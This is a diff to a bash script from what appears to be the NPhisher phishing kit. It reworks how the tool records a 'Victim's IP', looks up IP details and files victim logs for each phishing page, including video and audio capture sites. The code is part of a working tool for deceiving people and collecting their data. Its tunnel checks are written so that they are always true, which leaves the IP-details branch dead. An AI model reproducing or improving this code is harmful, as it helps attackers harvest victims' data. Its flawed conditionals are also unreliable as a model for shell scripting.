@@ -478,18 +478,24 @@ capture_ip() {
         IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
         IFS=$'\n'
         echo -e "\n${RED} Victim's IP : ${RED}$IP"
-				if [ reply_tunnel=1 ]; then
-					echo -ne "${RED} IP details cannot be captured in localhost server"
-				elif [ reply_tunnel=01 ]; then
-					echo -ne "${RED} IP details cannot be captured in localhost server"
-				else
-					ip_details
-				fi
+	if [ reply_tunnel=1 ]; then
+		echo -ne "${RED} IP details cannot be captured in localhost server"
+	elif [ reply_tunnel=01 ]; then
+		echo -ne "${RED} IP details cannot be captured in localhost server"
+	else
+		ip_details
+	fi
 	logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
-	mkdir ${logs_dir}
-	mv ${logs_dir} ${files_dir}/${site_name}
+	if [ -d ${files_dir}/${site_name}/${logs_dir} ]; then
+		cat .server/www/ip.txt >> ${logs_full_dir}/ip.txt
+		rm -rf .server/www/ip.txt
+	else
+		mkdir ${logs_dir}
+		mv ${logs_dir} ${files_dir}/${site_name}
+		mv .server/www/ip.txt ${logs_full_dir}
+	fi
         echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} ${logs_full_dir}"
-	mv .server/www/ip.txt ${logs_full_dir}
+
 }
 ip_details() {
 	IFS='\n'
@@ -548,8 +554,6 @@ ip_details() {
 	if [[ $region != "" ]]; then
 	echo -e "\n${GREEN} State: ${NC} $region"
 	fi
-	mv track.txt ${logs_full_dir}\
-	mv location.txt ${logs_full_dir}\
 }
 
 capture_data_image() {
@@ -648,9 +652,10 @@ case $reply_site in
                 site_video;;
 	3 | 03)
 		site_name=video
-								site_video_audio;;
+		site_video_audio;;
 	A | a)
 		xdg-open https://github.com/HPhisher/NPhisher
+		{ sleep 2; clear; banner; mainmenu; };;
 	B | b | C | c)
 	  	xdg-open https://github.com/HPhisher/NPhisher/issues/new
 		{ sleep 2; clear; banner; mainmenu; };;
